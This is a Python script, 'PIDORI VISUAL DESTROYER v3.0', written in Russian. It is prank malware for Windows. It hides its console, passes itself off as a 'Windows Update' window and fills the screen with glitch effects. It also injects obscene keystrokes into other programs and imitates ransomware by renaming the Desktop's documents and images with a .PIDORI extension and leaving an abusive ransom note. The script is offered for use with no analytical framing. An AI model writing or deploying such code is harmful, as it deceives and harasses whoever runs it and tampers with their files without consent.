#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PIDORI VISUAL DESTROYER v3.0
# Для Winlator / Windows

import os
import sys
import subprocess
import ctypes
import random
import threading
import time
import math

# ========== АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ==========
def install_deps():
    deps = ["pygame", "pillow", "opencv-python", "pynput"]
    for dep in deps:
        try:
            __import__(dep.replace("-", "_"))
        except ImportError:
            print(f"[*] Installing {dep}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "--quiet"])

install_deps()

# Теперь импортируем точно
import pygame
from PIL import Image, ImageFilter, ImageEnhance
import cv2
from pynput.keyboard import Key, Controller as KbController, Listener as KbListener

# ========== КОНСТАНТЫ ==========
SCREEN_W = ctypes.windll.user32.GetSystemMetrics(0)
SCREEN_H = ctypes.windll.user32.GetSystemMetrics(1)
USER_PATH = os.path.expanduser("~")
DESKTOP = os.path.join(USER_PATH, "Desktop")

# ========== ПЕЙЛОАДЫ ==========

# 1. Блокировка клавы с подменой ввода
keystrokes = ["лох", "pidor", "хаха", "взлом", "ты проиграл", "зря ты это скачал"]
def keyboard_fucker():
    kb = KbController()
    while True:
        time.sleep(random.uniform(3, 10))
        for char in random.choice(keystrokes):
            kb.type(char)
            time.sleep(0.05)

# 2. Эффект "расплавленного экрана"
def melt_screen(screen):
    w, h = screen.get_size()
    for _ in range(30):
        y = random.randint(h//2, h-1)
        strip_rect = pygame.Rect(0, y, w, h - y)
        strip = screen.subsurface(strip_rect).copy()
        offset = random.randint(-20, 20)
        screen.fill((0, 0, 0), strip_rect)
        screen.blit(strip, (offset, y))
        pygame.display.update(strip_rect)
        time.sleep(0.02)

# 3. Эффект "сдвиг реальности"
def reality_shift(screen):
    for _ in range(20):
        x = random.randint(0, SCREEN_W // 2)
        y = random.randint(0, SCREEN_H // 2)
        w = random.randint(100, SCREEN_W - x)
        h = random.randint(100, SCREEN_H - y)
        flip = pygame.transform.flip(screen.subsurface((x, y, w, h)).copy(), True, False)
        screen.blit(flip, (x, y))
        pygame.display.update((x, y, w, h))
        time.sleep(0.03)

# 4. Фейковое шифрование (имитация WannaCry)
def fake_ransomware():
    count = 0
    for root, dirs, files in os.walk(DESKTOP):
        for f in files:
            if f.endswith(('.txt', '.png', '.jpg', '.docx', '.pdf')):
                try:
                    new_name = f + ".PIDORI"
                    os.rename(os.path.join(root, f), os.path.join(root, new_name))
                    count += 1
                except:
                    pass
    # Создаём записку
    note = """
    ╔══════════════════════════════╗
    ║  ТВОИ ФАЙЛЫ ЗАХВАЧЕНЫ      ║
    ║  PIDORI GROUP               ║
    ║  Чтоб вернуть: пиши хуй     ║
    ║  на зеркало                 ║
    ╚══════════════════════════════╝
    """
    with open(os.path.join(DESKTOP, "ЧИТАЙ_СУКА.txt"), "w", encoding="utf-8") as f:
        f.write(note)
    return count

# 5. Глитч-машина (основной визуальный цикл)
def glitch_loop(screen, clock):
    for i in range(150):  # 150 кадров ада
        # Случайный эффект
        fx = random.randint(0, 5)
        
        if fx == 0:
            # Инверсия цветов
            arr = pygame.surfarray.pixels3d(screen)
            arr[:] = 255 - arr[:]
        elif fx == 1:
            # Волна
            for y in range(0, SCREEN_H, 3):
                offset = int(15 * math.sin(time.time() * 10 + y * 0.1))
                screen.blit(screen.subsurface((0, y, SCREEN_W, 1)).copy(), (offset, y))
        elif fx == 2:
            # Пиксельный дождь
            for _ in range(200):
                x = random.randint(0, SCREEN_W-1)
                y = random.randint(0, SCREEN_H-1)
                screen.set_at((x, y), (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        elif fx == 3:
            reality_shift(screen)
        elif fx == 4:
            melt_screen(screen)
        else:
            # Дрожание экрана
            offset_x = random.randint(-10, 10)
            offset_y = random.randint(-10, 10)
            screen.blit(screen, (offset_x, offset_y))
        
        pygame.display.flip()
        clock.tick(30)
        
        if i == 50:
            threading.Thread(target=keyboard_fucker, daemon=True).start()
        if i == 80:
            threading.Thread(target=fake_ransomware, daemon=True).start()

# ========== ГЛАВНАЯ ФУНКЦИЯ ==========
def main():
    # Скрываем консоль (если запущен через pythonw)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    pygame.init()
    screen = pygame.display.set_mode((SCREEN_W, SCREEN_H), pygame.NOFRAME)
    pygame.display.set_caption("Windows Update")
    
    # Захватываем скриншот экрана
    import pyautogui
    import io
    screenshot = pyautogui.screenshot()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format='BMP')
    screenshot_bytes.seek(0)
    bg = pygame.image.load(screenshot_bytes)
    screen.blit(bg, (0, 0))
    pygame.display.flip()
    
    clock = pygame.time.Clock()
    
    # Запускаем глитч-шоу
    glitch_loop(screen, clock)
    
    pygame.quit()
    sys.exit(0)

if __name__ == "__main__":
    main()